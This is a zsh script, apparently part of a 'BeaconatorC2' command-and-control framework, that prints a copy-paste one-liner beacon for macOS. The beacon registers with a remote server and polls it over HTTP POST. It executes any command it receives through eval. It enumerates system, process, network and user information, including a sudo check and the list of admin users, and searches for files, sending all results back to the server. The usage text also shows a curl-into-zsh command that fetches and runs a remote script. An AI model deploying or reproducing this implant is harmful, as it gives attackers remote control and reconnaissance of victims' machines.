#!/bin/zsh
#
# zsh One-Liner Beacon for BeaconatorC2 (macOS Optimized)
# A minimal shell-based beacon designed for zsh and macOS environments
# Supports HTTP communication with the BeaconatorC2 framework
#

# Configuration (modify these variables)
DEFAULT_SERVER="127.0.0.1"
DEFAULT_PORT="8080"
DEFAULT_ENDPOINT="/"
DEFAULT_INTERVAL="15"

# Function to generate the simplified one-liner beacon
generate_oneliner() {
    local server="${1:-$DEFAULT_SERVER}"
    local port="${2:-$DEFAULT_PORT}"
    local endpoint="${3:-$DEFAULT_ENDPOINT}"
    local interval="${4:-$DEFAULT_INTERVAL}"
    
    cat << 'EOF'
(LOG="/tmp/zsh_beacon_debug.log";exec 3>>"$LOG";S="${SERVER:-127.0.0.1}";P="${PORT:-8080}";E="${ENDPOINT:-/}";I="${INTERVAL:-15}";ID=$(echo -n "$(scutil --get ComputerName 2>/dev/null || hostname)$(whoami)$(date +%s)$$" | md5 -q 2>/dev/null | cut -c1-8);URL="http://$S:$P$E";UA="ZshBeacon/$ID";echo "[$(date)] Starting beacon - ID: $ID, URL: $URL" >&3;REG_RESP=$(curl -s -X POST "$URL" -H "User-Agent: $UA" -d "register|$ID|$(scutil --get ComputerName 2>/dev/null || hostname)" 2>&1);echo "[$(date)] Registration response: $REG_RESP" >&3;while true;do echo "[$(date)] Requesting commands..." >&3;CMD=$(curl -s -X POST "$URL" -H "User-Agent: $UA" -d "request_action|$ID" 2>&1);echo "[$(date)] Received command: $CMD" >&3;if [[ "$CMD" != "no_pending_commands" && -n "$CMD" && "$CMD" != ERROR* ]];then OUT="";echo "[$(date)] Processing command: $CMD" >&3;case "$CMD" in shutdown)OUT="=== CLEANUP ===$'\n'Stopping beacon and cleaning up...";echo "[$(date)] Shutdown command received" >&3;curl -s -X POST "$URL" -H "User-Agent: $UA" -d "command_output|$ID|$OUT" 2>&1;break;; execute_command\|*)echo "[$(date)] Executing command: ${CMD#execute_command|}" >&3;OUT=$(eval "${CMD#execute_command|}" 2>&1);; execute_module\|*)MOD="${${CMD#execute_module|}%%|*}";PARAMS="${CMD#execute_module|$MOD}";PARAMS="${PARAMS#|}";echo "[$(date)] Executing module: $MOD with params: $PARAMS" >&3;case "$MOD" in SystemInfo)OUT="=== SYSTEM INFO ===$'\n'Hostname: $(scutil --get ComputerName 2>/dev/null || hostname)$'\n'User: $(whoami)$'\n'UID: $(id -u)$'\n'Groups: $(id -Gn | tr ' ' ',')$'\n'macOS Version: $(sw_vers -productVersion 2>/dev/null)$'\n'Build: $(sw_vers -buildVersion 2>/dev/null)$'\n'Uptime: $(uptime)$'\n'Shell: $SHELL$'\n'Zsh Version: $ZSH_VERSION$'\n'PWD: $(pwd)$'\n'PID: $$";; ProcessEnum)OUT="=== PROCESS ENUMERATION ===$'\n'$(ps aux | head -20)";; NetworkEnum)OUT="=== NETWORK ENUMERATION ===$'\n'Interfaces:$'\n'$(ifconfig | grep -E '^[a-z]|inet ' | head -20)$'\n\n'Network Services:$'\n'$(scutil --dns 2>/dev/null | grep 'nameserver\|search' | head -5)$'\n\n'Active Connections:$'\n'$(netstat -an | grep -E 'tcp.*LISTEN|tcp.*ESTABLISHED' | head -10)";; UserEnum)OUT="=== USER ENUMERATION ===$'\n'Current User: $(whoami) (UID: $(id -u))$'\n'Groups: $(id -Gn)$'\n'Sudo Check: $(sudo -n true 2>/dev/null && echo 'SUDO ACCESS' || echo 'No sudo access')$'\n'Home Dir: $HOME$'\n'Local Users:$'\n'$(dscl . -list /Users | grep -v '^_' | head -10)$'\n'Admin Users:$'\n'$(dscl . -read /Groups/admin GroupMembership 2>/dev/null | cut -d' ' -f2-)";; FileSearch)DIR="${PARAMS%,*}";PATTERN="${PARAMS#*,}";DIR="${DIR:-/tmp}";PATTERN="${PATTERN:-txt}";OUT="=== FILE SEARCH ===$'\n'Searching for '$PATTERN' in '$DIR'$'\n'$(find "$DIR" -name "*$PATTERN*" -type f 2>/dev/null | head -20)";; Cleanup)OUT="=== CLEANUP ===$'\n'Stopping beacon and cleaning up...";echo "[$(date)] Cleanup module executed" >&3;curl -s -X POST "$URL" -H "User-Agent: $UA" -d "command_output|$ID|$OUT" 2>&1;break;; *)OUT="ERROR: Unknown module '$MOD'";; esac;; *)echo "[$(date)] Evaluating direct command: $CMD" >&3;OUT=$(eval "$CMD" 2>&1);; esac;echo "[$(date)] Sending output (length: ${#OUT})" >&3;SEND_RESP=$(curl -s -X POST "$URL" -H "User-Agent: $UA" -d "command_output|$ID|$OUT" 2>&1);echo "[$(date)] Send response: $SEND_RESP" >&3;else echo "[$(date)] No pending commands or error: $CMD" >&3;fi;echo "[$(date)] Sleeping for $I seconds..." >&3;sleep "$I";done;echo "[$(date)] Beacon exiting" >&3;exec 3>&-) &
EOF
}

# Function to generate customized one-liner
generate_custom_oneliner() {
    local server="${1:-$DEFAULT_SERVER}"
    local port="${2:-$DEFAULT_PORT}"
    local endpoint="${3:-$DEFAULT_ENDPOINT}"
    local interval="${4:-$DEFAULT_INTERVAL}"
    
    # Replace placeholders in the one-liner
    generate_oneliner | sed "s/\${SERVER:-127.0.0.1}/\${SERVER:-$server}/g" | \
                       sed "s/\${PORT:-8080}/\${PORT:-$port}/g" | \
                       sed "s/\${ENDPOINT:-\/}/\${ENDPOINT:-$(echo "$endpoint" | sed 's/\//\\\//g')}/g" | \
                       sed "s/\${INTERVAL:-15}/\${INTERVAL:-$interval}/g"
}

# Function to show usage
show_usage() {
    cat << EOF
zsh One-Liner Beacon Generator for BeaconatorC2 (macOS Optimized)

Usage: $0 [OPTIONS]

OPTIONS:
    -h, --help              Show this help message
    -s, --server SERVER     Server IP/hostname (default: $DEFAULT_SERVER)
    -p, --port PORT         Server port (default: $DEFAULT_PORT)
    -e, --endpoint PATH     HTTP endpoint (default: $DEFAULT_ENDPOINT)
    -i, --interval SECONDS  Check-in interval (default: $DEFAULT_INTERVAL)
    -g, --generate          Generate default one-liner
    -c, --custom            Generate custom one-liner with provided options

Examples:
    # Generate default one-liner
    $0 --generate

    # Generate custom one-liner for specific server
    $0 --custom --server 192.168.1.100 --port 8080

    # Execute the one-liner directly (for testing)
    SERVER=192.168.1.100 PORT=8080 zsh -c "\$(curl -s http://192.168.1.100/beacon.sh)"

Core Modules Supported:
    - SystemInfo: macOS system information using native commands
    - ProcessEnum: Running process enumeration
    - NetworkEnum: Network interface and connection info using macOS tools
    - UserEnum: User enumeration using dscl and macOS-specific commands
    - FileSearch: Search for files by pattern
    - Cleanup: Stop beacon and cleanup

macOS-Specific Features:
    - Uses scutil for computer name and DNS information
    - Leverages sw_vers for macOS version details
    - Uses dscl for user and group enumeration
    - Optimized for macOS networking tools
    - Clean zsh syntax and parameter expansion
    - Native macOS hostname resolution

The one-liner runs in the background and communicates with BeaconatorC2 via HTTP POST requests.
Designed specifically for zsh (default shell on macOS 10.15+) and macOS environments.
EOF
}

# Main execution
main() {
    local server="$DEFAULT_SERVER"
    local port="$DEFAULT_PORT"
    local endpoint="$DEFAULT_ENDPOINT" 
    local interval="$DEFAULT_INTERVAL"
    local action=""

    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--help)
                show_usage
                exit 0
                ;;
            -s|--server)
                server="$2"
                shift 2
                ;;
            -p|--port)
                port="$2"
                shift 2
                ;;
            -e|--endpoint)
                endpoint="$2"
                shift 2
                ;;
            -i|--interval)
                interval="$2"
                shift 2
                ;;
            -g|--generate)
                action="generate"
                shift
                ;;
            -c|--custom)
                action="custom"
                shift
                ;;
            *)
                echo "Unknown option: $1"
                show_usage
                exit 1
                ;;
        esac
    done

    case "$action" in
        generate)
            echo "# Default zsh One-Liner Beacon (macOS Optimized)"
            echo "# Copy and paste the following into a zsh terminal:"
            echo ""
            generate_oneliner
            echo ""
            ;;
        custom)
            echo "# Custom zsh One-Liner Beacon (macOS Optimized)"
            echo "# Server: $server:$port$endpoint"
            echo "# Interval: $interval seconds"
            echo "# Copy and paste the following into a zsh terminal:"
            echo ""
            generate_custom_oneliner "$server" "$port" "$endpoint" "$interval"
            echo ""
            ;;
        *)
            show_usage
            ;;
    esac
}

# Run main function if script is executed directly
if [[ "${ZSH_ARGZERO:t}" == "${0:t}" ]]; then
    main "$@"
fi